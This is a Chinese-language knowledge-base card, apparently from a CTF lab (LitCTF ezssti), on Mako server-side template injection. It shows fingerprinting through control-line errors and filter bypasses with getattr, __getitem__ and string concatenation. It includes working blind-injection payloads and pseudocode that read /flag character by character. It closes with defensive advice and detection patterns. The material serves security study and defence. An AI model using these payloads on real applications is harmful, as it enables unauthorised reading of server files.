---
id: web-python-ssti-mako-percent-control-getattr-getitem-blind
title: Mako 模板识别后用 getattr/__getitem__ 绕过点号与括号过滤做布尔盲注读文件
type: scenario
domain: web
path: web/python/ssti
technique: mako-ssti
tags:
- ssti
- python
- mako
- getattr
- blind-injection
- waf-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:31:10+08:00'
  notes: 已对照原文与图02-07核对：常见 SSTI 探测被 WAF/不渲染、单个百分号触发 SyntaxException Invalid control line、百分号 if 控制行返回 OK 确认 Mako；单字符 fuzz 显示点号与方括号被过滤；字符串拼接的 open 可读 /flag；getattr 与 __getitem__ 盲注脚本及实测 flag 均与卡片一致。未验证点：PoC 未本机复跑；CTF 无组件版本；frontmatter 无 sources/source_url。
url: /docs/web/python/ssti/web-python-ssti-mako-percent-control-getattr-getitem-blind/
draft: false
kb_aliases:
- Mako 模板注入
- '% if 控制行盲注'
- getattr 绕过点号
- __getitem__ 截取字符
- LitCTF ezssti
---

## 一句话结论

当 `${7*7}`、`<%= 7*7 %>` 被 WAF 拦截而 `%` 触发 `Invalid control line` 报错时，可判定模板引擎为 Mako；在 `${}`、`.`、`[]` 被过滤的环境下，用 `getattr` 取 `open(...).read`、用 `__getitem__` 按下标取字符，配合 `% if ... in 'c':` 的页面差异做布尔盲注即可逐字符读出 `/flag`。

## 原理

- Mako 支持 `% if ...:` / `% endif` 的控制行语法，非 Mako 引擎对 `%` 通常会渲染为普通文本；服务端返回 `SyntaxException: Invalid control line` 说明 `%` 被当作模板控制语法解析，从而确认 Mako。
- `${...}` 表达式在渲染时按 Python 语义求值，默认无沙箱；但题目过滤了 `${}`、`<%= %>` 与点号 `.`、中括号 `[]`。
- 点号可用 `getattr(obj, 'attr')` 等价替代：`getattr(open("/flag"), 'read')()` 等于 `open('/flag').read()`。
- 中括号下标可用 `getattr(s, '__getitem__')(i)` 等价替代（`s[i]` 的底层就是调用 `__getitem__`）。
- 文件名中的 `flag` 关键词被过滤时，用 `"/"+"f"+"l"+"a"+"g"` 字符串拼接绕过。
- 没有回显时，`% if <条件>:` 与固定输出 `True_Flag` 是否出现构成布尔 oracle，逐位枚举字符即可外带文件内容。

## 触发条件

- 应用把用户输入作为 Mako 模板源码渲染（`Template(user_input).render()`）。
- 存在可读文件（如容器内 `/flag`），模板执行进程有读权限。
- WAF 过滤了 `${`、`<%=`、`.`、`[]` 或 `flag` 等特征，但未拦截 `%` 控制行与 `getattr`/`__getitem__`。

## 利用步骤

1. 指纹探测：提交 `${7*7}`、`{{7*7}}`、`<%= 7*7 %>`；若前两者返回 WAF/不渲染，提交单个 `%` 观察是否出现 `SyntaxException: Invalid control line`。
2. 提交 `% if 1:\nOK\n% endif`，页面出现 `OK` 即确认 Mako。
3. 单字符 fuzz（32–126）找出被过滤字符，确认 `.`、`[`、`]`、`$`、`{`、`}` 等黑名单。
4. 验证文件可读：`% if open("/"+"f"+"l"+"a"+"g"):\nOK\n% endif`。
5. 逐位盲注：`% if getattr(getattr(open("/"+"f"+"l"+"a"+"g"), 'read')(), '__getitem__')(i) in 'c':\nTrue_Flag\n% endif`，按返回页面是否含 `True_Flag` 判断第 i 位字符。
6. 脚本按字符集 `}{-abcdefghijklmnopqrstuvwxyz0123456789` 循环，遇 `}` 结束。

## PoC

```python
payload = """% if getattr(getattr(open("/"+"f"+"l"+"a"+"g"), 'read')(), '__getitem__')(0) in 'f':
True_Flag
% endif"""
# POST tpl=payload；响应含 <pre id="out">True_Flag 即第 0 位为 f
```

```python
# 逐位盲注伪代码
for i in range(0, 128):
    for c in '}{-abcdefghijklmnopqrstuvwxyz0123456789':
        if inject(i, c):
            print(c, end='')
            if c == '}':
                exit()
            break
```

## 变体与关联

- 若 `getattr` 也被过滤，可尝试 `__getattribute__`、字典/`vars()`、`format` 拼接等替代。
- 有回显时可直接 `getattr(getattr(open("/flag"), 'read')(), '__getitem__')` 拼出子串。
- 关联：[[web-python-ssti-mako-context-write-getattr-bypass]]（Mako 通用利用与 `${}`/`<% %>` 回显）。

## 检测与防御

- 禁止将用户输入作为模板源码；使用固定模板 + 变量渲染。
- 检测请求中出现 `% if`、`% endif`、`getattr`、`__getitem__`、`__class__` 等模板/反射特征，以及 `SyntaxException`/`MakoException` 渲染错误。
- 对模板引擎启用沙箱或白名单，不能只过滤 `${`。
